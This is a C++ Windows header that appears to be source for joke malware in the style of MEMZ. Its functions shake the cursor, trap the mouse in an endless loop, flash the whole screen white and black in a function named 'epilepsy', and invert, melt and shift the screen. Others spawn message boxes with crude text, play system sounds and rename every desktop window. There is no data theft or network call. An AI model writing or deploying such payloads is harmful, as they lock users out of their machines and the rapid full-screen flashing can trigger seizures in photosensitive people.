#pragma once
#include "utils.hpp"
#include <math.h>
#include <stdlib.h>
#include <thread>
#include <time.h>
#include <windows.h>

const int MOUSESHAKE = 30;

int w = GetSystemMetrics(SM_CXSCREEN);
int h = GetSystemMetrics(SM_CYSCREEN);

HDC hdc = GetDC(0);

POINT cursor;
int ix = GetSystemMetrics(SM_CXICON) / 2;
int iy = GetSystemMetrics(SM_CYICON) / 2;

void moveMouse()
{
    GetCursorPos(&cursor);
    SetCursorPos(cursor.x + (Utils::random() % MOUSESHAKE - MOUSESHAKE / 2),
        cursor.y + (Utils::random() % MOUSESHAKE - MOUSESHAKE / 2));
}

void trapMouseForever()
{
    GetCursorPos(&cursor);
    while (1) {
        SetCursorPos(cursor.x, cursor.y);
        Sleep(1);
    }
}

void drawErrorCursor()
{
    GetCursorPos(&cursor);
    DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_EXCLAMATION));
}

void screenGlitch()
{
    int x1 = Utils::random(w - 1000);
    int y1 = Utils::random(h - 1000);
    int x2 = Utils::random(w - 1000);
    int y2 = Utils::random(h - 1000);
    BitBlt(hdc, x1, y1, w, h, hdc, x2, y2, SRCERASE);
}

void epilepsy()
{
    BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, WHITENESS);
    Sleep(10);
    BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, BLACKNESS);
}

void screenInvert() { BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY); }

void screenTunnel()
{
    StretchBlt(hdc, 50, 50, w - 100, h - 100, hdc, 0, 0, w, h, SRCCOPY);
}

void drawText(const char* text)
{
    int x1 = Utils::random(w);
    int y1 = Utils::random(h);
    RECT rect = { x1, y1, x1, y1 };
    DrawTextA(hdc, text, -1, &rect, DT_NOCLIP);
}

LONG_PTR CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam)
{
    CWPRETSTRUCT* msg = (CWPRETSTRUCT*)lParam;

    if (msg->message == WM_INITDIALOG) {
        int X = Utils::random(GetSystemMetrics(SM_CXSCREEN));
        int Y = Utils::random(GetSystemMetrics(SM_CYSCREEN));
        SetWindowPos(msg->hwnd, 0, X, Y, 0, 0, SWP_NOZORDER | SWP_NOSIZE | SWP_SHOWWINDOW);
        for (int i = 1; i <= 11; i++)
            SetWindowTextA(GetDlgItem(msg->hwnd, i), "Omegalul");
    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD CALLBACK msgBoxThr(void* param)
{
    HHOOK hook = SetWindowsHookExA(WH_CALLWNDPROCRET, msgBoxHook, 0, GetCurrentThreadId());
    DWORD msg = Utils::random(7) + (Utils::random(5) << 4);
    MessageBoxA(NULL, "text", "caption", msg);
    Sleep(1000);
    UnhookWindowsHookEx(hook);
    return 0;
}

void spawnMsgBox()
{
    CreateThread(nullptr, 0, &msgBoxThr, nullptr, 0, nullptr);
}

void payloadEarthquake()
{
    int power = 50;

    HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
    HDC hdc2 = CreateCompatibleDC(hdc);
    SelectObject(hdc2, screenshot);

    BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    BitBlt(hdc, 0, 0, w, h, hdc2, (Utils::random(power)) - (power / 2),
        (Utils::random(power)) - (power / 2), SRCCOPY);
    Sleep(50);
    BitBlt(hdc, 0, 0, w, h, hdc2, 0, 0, SRCCOPY);

    DeleteDC(hdc2);
    DeleteObject(screenshot);
}

void melt()
{
    HBITMAP screenshot = CreateCompatibleBitmap(hdc, 500, h);
    HDC hdc2 = CreateCompatibleDC(hdc);
    SelectObject(hdc2, screenshot);

    for (int i = 0; i < 20; i++) {
        int x = Utils::random(w - 20 / 2);
        for (; x % 20 != 0; x++) {
        }

        BitBlt(hdc2, 0, 0, 20, h, hdc, x, 0, SRCCOPY);

        for (int j = 0; j < 20; j++) {
            int depth = sin(j / ((float)20) * 3.14159) * (50);
            StretchBlt(hdc2, j, 0, 1, depth, hdc2, j, 0, 1, 1, SRCCOPY);
            BitBlt(hdc2, j, 0, 1, h, hdc2, j, -depth, SRCCOPY);
        }

        BitBlt(hdc, x, 0, 20, h, hdc2, 0, 0, SRCCOPY);
    }

    DeleteDC(hdc2);
    DeleteObject(screenshot);
}

const unsigned long sounds[] = {
    SND_ALIAS_SYSTEMHAND, SND_ALIAS_SYSTEMEXCLAMATION,
    SND_ALIAS_SYSTEMASTERISK, SND_ALIAS_SYSTEMQUESTION,
    SND_ALIAS_SYSTEMSTART, SND_ALIAS_SYSTEMEXIT
};

void payloadSound()
{
    PlaySoundA((LPCSTR)sounds[Utils::random(6)], GetModuleHandle(NULL),
        SND_ASYNC | SND_ALIAS_ID);
}

BOOL CALLBACK callbackEnum(HWND hWnd, LPARAM lParam)
{
    SendMessageTimeoutA(hWnd, WM_SETTEXT, 0, lParam, SMTO_ABORTIFHUNG, 100, 0);
    return 1;
}

void setWinTitle(LPCSTR t)
{
    EnumChildWindows(GetDesktopWindow(), &callbackEnum, (long)t);
}

int mouseX, mouseY;
LONG_PTR CALLBACK followMouseBoxHook(int nCode, WPARAM wParam, LPARAM lParam)
{
    CWPRETSTRUCT* msg = (CWPRETSTRUCT*)lParam;

    if (msg->message == WM_INITDIALOG) {
        SetWindowPos(msg->hwnd, 0, mouseX, mouseY, 0, 0, SWP_NOZORDER | SWP_NOSIZE | SWP_SHOWWINDOW);
        for (int i = 1; i <= 11; i++)
            SetWindowTextA(GetDlgItem(msg->hwnd, i), "fucc");
    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI followMouseBoxThread(void* param)
{
    HHOOK hook = SetWindowsHookExA(WH_CALLWNDPROCRET, followMouseBoxHook, 0, GetCurrentThreadId());
    DWORD msg = Utils::random(7) + (Utils::random(5) << 4);
    MessageBoxA(NULL, "mouse fucked", "no clicky boi", msg);
    Sleep(1000);
    UnhookWindowsHookEx(hook);
    return 0;
}

POINT sp;
void msgboxmousefollow()
{
    POINT p;
    if (GetCursorPos(&p)) {
        if (p.x != sp.x || p.y != sp.y) {
            mouseX = p.x;
            mouseY = p.y;
            CreateThread(nullptr, 0, &followMouseBoxThread, nullptr, 0, nullptr);
            Sleep(100);
        }
        sp = p;
    }
}
